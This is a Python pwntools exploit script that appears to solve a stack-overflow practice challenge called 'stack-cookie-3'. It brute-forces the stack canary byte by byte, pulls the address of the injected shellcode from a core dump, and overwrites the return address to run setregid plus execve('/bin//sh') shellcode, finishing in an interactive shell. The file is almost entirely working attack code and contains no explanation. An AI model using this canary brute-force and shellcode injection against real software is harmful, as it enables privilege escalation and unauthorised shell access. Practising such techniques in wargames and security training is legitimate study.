#!/usr/bin/env python

from pwn import *
#SHELLCODE = 'SET YOUR SHELLCODE HERE'
SHELLCODE = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80'

# You may set your shellcode in ENVP...
ENV = { 'SHELLCODE' : SHELLCODE }

# You may set your shellcode in ARGV...
ARG1 = SHELLCODE
if os.path.exists("./core"):
        os.unlink("./core")

p = process(["./stack-cookie-3",ARG1],env=ENV)

def check():
    cookie = "\x00"
    for i in xrange(256):
        print(p.recvuntil('read?\n'))
# [ BUFFER (0x80) ] [Cookie] [XXXX] [YYYY] [Saved ebp] [RET] ...
        p.sendline(str(0x80+len(cookie) + 1))
        print(p.recv(0x1000))
        p.send('A'*0x80 + cookie + chr(i))
        data = ''
        while True:
             data += p.recv(1)
             if 'detected' in data:
                 break
             if 'Exit status: 0' in data:
                 break
        data += p.recvuntil('\n')
        if 'smashing' in data:
             print data
             pass
        else:
             print("next byte: %d" % i)
             cookie += chr(i)
             print data
             return cookie

def check2(c):
    cookie = c
    for i in xrange(256):
        print(p.recvuntil('read?\n'))
# [ BUFFER (0x80) ] [Cookie] [XXXX] [YYYY] [Saved ebp] [RET] ...
        p.sendline(str(0x80+len(cookie) + 1))
        print(p.recv(0x1000))
        p.send('A'*0x80 + cookie + chr(i))
        data = ''
        while True:
            data += p.recv(1)
            if 'detected' in data:
                break
            if 'Exit status: 0' in data:
                break
        data += p.recvuntil('\n')
        if 'smashing' in data:
            print data
            pass
        else:
            print("next byte: %d" % i)
            cookie += chr(i)
            print data
            return cookie

def check3(c):
    cookie = c
    for i in xrange(256):
        print(p.recvuntil('read?\n'))

        p.sendline(str(0x80+len(cookie) + 1))
        print(p.recv(0x1000))
        p.send('A'*0x80 + cookie + chr(i))
        data = ''
        while True:
             data += p.recv(1)
             if 'detected' in data:
                 break
             if 'Exit status: 0' in data:
                 break
        data += p.recvuntil('\n')
        if 'smashing' in data:
            print data
            pass
        else:
            print("next byte: %d" % i)
            cookie += chr(i)
            print data
            return cookie

cookie = check3(check2(check()))
print(cookie)

#p.wait()
c = Core('core')
addr_of_shellcode = c.stack.find(SHELLCODE)
print("addr_of_sh %s" % addr_of_shellcode )
print("stack %s" % hex(addr_of_shellcode))

p.sendline(str(0x94))
string = "Z" * 0x80 + cookie + "BBBB"  + "CCCC" + "DDDD" + p32(addr_of_shellcode)
p.send(string)

p.interactive()
